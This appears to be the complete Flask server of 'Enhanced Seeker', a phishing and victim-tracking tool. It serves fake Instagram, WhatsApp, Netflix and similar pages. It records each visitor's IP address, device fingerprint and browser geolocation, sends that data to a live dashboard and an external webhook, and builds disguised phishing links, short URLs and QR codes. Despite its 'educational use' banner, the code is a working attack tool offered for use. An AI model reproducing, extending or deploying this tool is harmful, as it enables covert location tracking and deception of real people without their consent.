#!/usr/bin/env python3
"""
Enhanced Seeker - Advanced Geolocation Tool with Real-time Dashboard
Educational/Research Tool - Use Responsibly and Ethically
Author: Enhanced Seeker Team
"""

from flask import Flask, render_template, request, jsonify, redirect, url_for, flash
from flask_socketio import SocketIO, emit
import json
import os
import time
import threading
from datetime import datetime
import sqlite3
from config import Config
from database import Database
from utils.fingerprint import DeviceFingerprinter
from utils.analytics import AnalyticsEngine
from utils.tunnel import TunnelManager
from utils.webhook import WebhookManager
import logging

app = Flask(__name__)
app.config.from_object(Config)
socketio = SocketIO(app, cors_allowed_origins="*")

# Initialize components
db = Database()
fingerprinter = DeviceFingerprinter()
analytics = AnalyticsEngine(db)
tunnel_manager = TunnelManager()
webhook_manager = WebhookManager()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('seeker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Global variables for tracking
active_sessions = {}
current_template = "instagram"

@app.route('/')
def dashboard():
    """Main dashboard view"""
    return render_template('dashboard.html')

@app.route('/templates')
def template_manager():
    """Template management interface"""
    templates = [
        'instagram', 'whatsapp', 'snapchat', 'tiktok',
        'uber', 'netflix', 'spotify', 'amazon'
    ]
    return render_template('template_manager.html', templates=templates)

@app.route('/analytics')
def analytics_view():
    """Analytics and reporting interface"""
    stats = analytics.get_statistics()
    return render_template('analytics.html', stats=stats)

@app.route('/history')
def session_history():
    """Session history and logs"""
    sessions = db.get_all_sessions()
    return render_template('session_history.html', sessions=sessions)

@app.route('/api/sessions')
def get_sessions():
    """API endpoint for active sessions"""
    return jsonify(list(active_sessions.values()))

@app.route('/api/statistics')
def get_statistics():
    """API endpoint for analytics data"""
    return jsonify(analytics.get_statistics())

@app.route('/api/export/<format>')
def export_data(format):
    """Export data in various formats"""
    if format == 'csv':
        return analytics.export_csv()
    elif format == 'json':
        return analytics.export_json()
    elif format == 'kml':
        return analytics.export_kml()
    else:
        return jsonify({'error': 'Invalid format'}), 400

@app.route('/api/tunnel/start/<service>')
def start_tunnel(service):
    """Start tunnel service"""
    try:
        url = tunnel_manager.start_tunnel(service)
        return jsonify({'status': 'success', 'url': url})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tunnel/stop')
def stop_tunnel():
    """Stop tunnel service"""
    tunnel_manager.stop_tunnel()
    return jsonify({'status': 'success'})

@app.route('/api/template/set/<template_name>')
def set_template(template_name):
    """Set active template"""
    global current_template
    templates = ['instagram', 'whatsapp', 'snapchat', 'tiktok', 'uber', 'netflix', 'spotify', 'amazon']
    if template_name in templates:
        current_template = template_name
        logger.info(f"Template changed to: {template_name}")
        return jsonify({'status': 'success', 'template': template_name})
    return jsonify({'status': 'error', 'message': 'Invalid template'}), 400

# Phishing page routes
@app.route('/phish')
@app.route('/phish/<template>')
def phishing_page(template=None):
    """Serve phishing pages"""
    if template is None:
        template = current_template
    
    # Log the access
    user_agent = request.headers.get('User-Agent', '')
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    
    session_id = f"{ip_address}_{int(time.time())}"
    session_data = {
        'id': session_id,
        'ip': ip_address,
        'user_agent': user_agent,
        'template': template,
        'timestamp': datetime.now().isoformat(),
        'status': 'active'
    }
    
    active_sessions[session_id] = session_data
    db.save_session(session_data)
    
    # Emit to dashboard
    socketio.emit('new_session', session_data)
    
    logger.info(f"New session: {session_id} from {ip_address} using {template} template")
    
    return render_template(f'phishing/{template}.html', session_id=session_id)

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """Collect location and device data"""
    try:
        data = request.get_json()
        session_id = data.get('session_id')
        
        if session_id not in active_sessions:
            return jsonify({'status': 'error', 'message': 'Invalid session'}), 400
        
        # Enhance data with fingerprinting
        enhanced_data = fingerprinter.enhance_data(data, request)
        
        # Add timestamp
        enhanced_data['collected_at'] = datetime.now().isoformat()
        
        # Save to database
        db.save_location_data(session_id, enhanced_data)
        
        # Update session
        active_sessions[session_id].update({
            'location': enhanced_data.get('location', {}),
            'device': enhanced_data.get('device', {}),
            'status': 'data_collected'
        })
        
        # Emit real-time update
        socketio.emit('location_update', {
            'session_id': session_id,
            'data': enhanced_data
        })
        
        # Send webhook if configured
        webhook_manager.send_data(enhanced_data)
        
        logger.info(f"Data collected for session: {session_id}")
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logger.error(f"Error collecting data: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    logger.info("Client connected to WebSocket")
    emit('connected', {'status': 'Connected to Enhanced Seeker'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnection"""
    logger.info("Client disconnected from WebSocket")

@app.route('/api/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'version': '2.0.0',
        'timestamp': datetime.now().isoformat(),
        'active_sessions': len(active_sessions),
        'tunnel_status': tunnel_manager.get_status()
    })

# New Miscellaneous Functions
@app.route('/tools')
def tools_page():
    """Advanced tools and utilities page"""
    return render_template('tools.html')

@app.route('/api/tools/ip-lookup/<ip>')
def ip_lookup(ip):
    """IP geolocation lookup"""
    try:
        import requests
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org,as,query')
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return jsonify({
                    'status': 'success',
                    'ip': data['query'],
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'latitude': data.get('lat', 0),
                    'longitude': data.get('lon', 0),
                    'timezone': data.get('timezone', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'organization': data.get('org', 'Unknown'),
                    'as_number': data.get('as', 'Unknown')
                })
            else:
                return jsonify({'status': 'error', 'message': data.get('message', 'Invalid IP')}), 400
        else:
            return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tools/device-info')
def device_info():
    """Get detailed device information from request headers"""
    try:
        import user_agents
        
        user_agent_string = request.headers.get('User-Agent', '')
        user_agent = user_agents.parse(user_agent_string)
        
        device_info = {
            'user_agent': user_agent_string,
            'browser': {
                'family': user_agent.browser.family,
                'version': user_agent.browser.version_string
            },
            'os': {
                'family': user_agent.os.family,
                'version': user_agent.os.version_string
            },
            'device': {
                'family': user_agent.device.family,
                'brand': user_agent.device.brand,
                'model': user_agent.device.model
            },
            'is_mobile': user_agent.is_mobile,
            'is_tablet': user_agent.is_tablet,
            'is_pc': user_agent.is_pc,
            'is_bot': user_agent.is_bot,
            'headers': dict(request.headers),
            'ip_address': request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
            'timestamp': datetime.now().isoformat()
        }
        
        return jsonify({
            'status': 'success',
            'device_info': device_info
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tools/generate-url')
def generate_url():
    """Generate custom phishing URLs with parameters"""
    try:
        template = request.args.get('template', current_template)
        custom_title = request.args.get('title', '')
        custom_message = request.args.get('message', '')
        redirect_url = request.args.get('redirect', 'https://google.com')
        
        base_url = request.host_url.rstrip('/')
        phish_url = f"{base_url}/phish/{template}"
        
        params = []
        if custom_title:
            params.append(f"title={custom_title}")
        if custom_message:
            params.append(f"message={custom_message}")
        if redirect_url != 'https://google.com':
            params.append(f"redirect={redirect_url}")
        
        if params:
            phish_url += "?" + "&".join(params)
        
        return jsonify({
            'status': 'success',
            'url': phish_url,
            'qr_code_url': f"{base_url}/api/tools/qr-code?url={phish_url}",
            'short_url': f"{base_url}/s/{abs(hash(phish_url)) % 100000}",
            'template': template
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tools/qr-code')
def generate_qr_code():
    """Generate QR code for URLs"""
    try:
        url = request.args.get('url', '')
        if not url:
            return jsonify({'status': 'error', 'message': 'URL parameter required'}), 400
        
        # For demonstration, return a placeholder QR code service URL
        qr_service_url = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={url}"
        
        return jsonify({
            'status': 'success',
            'qr_code_url': qr_service_url,
            'url': url
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tools/live-sessions')
def live_sessions():
    """Get live session monitoring data"""
    try:
        live_data = []
        for session_id, session in active_sessions.items():
            session_info = {
                'id': session_id,
                'ip': session['ip'],
                'template': session['template'],
                'status': session['status'],
                'timestamp': session['timestamp'],
                'duration': time.time() - int(session_id.split('_')[-1]) if '_' in session_id else 0,
                'location': session.get('location', {}),
                'device': session.get('device', {})
            }
            live_data.append(session_info)
        
        return jsonify({
            'status': 'success',
            'sessions': live_data,
            'total_active': len(active_sessions),
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tools/clear-sessions')
def clear_sessions():
    """Clear all active sessions"""
    try:
        global active_sessions
        session_count = len(active_sessions)
        active_sessions.clear()
        
        # Emit update to dashboard
        socketio.emit('sessions_cleared', {'cleared_count': session_count})
        
        return jsonify({
            'status': 'success',
            'message': f'Cleared {session_count} active sessions'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tunnel/status')
def tunnel_status():
    """Get current tunnel status"""
    try:
        status = tunnel_manager.get_status()
        return jsonify({
            'status': 'success',
            'tunnel_active': status.get('active', False),
            'tunnel_url': status.get('url', ''),
            'tunnel_service': status.get('service', ''),
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return redirect(url_for('dashboard'))

@app.errorhandler(404)
def not_found(error):
    """Custom 404 handler"""
    return redirect(url_for('phishing_page'))

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║          Enhanced Seeker v2.0         ║
    ║     Advanced Geolocation Tool         ║
    ║                                       ║
    ║  Educational/Research Use Only        ║
    ║  Use Responsibly and Ethically        ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Initialize database
    db.init_db()
    
    print(f"Starting Enhanced Seeker on http://0.0.0.0:5000")
    print(f"Dashboard: http://0.0.0.0:5000")
    print(f"Phishing URLs will be available at: http://0.0.0.0:5000/phish")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
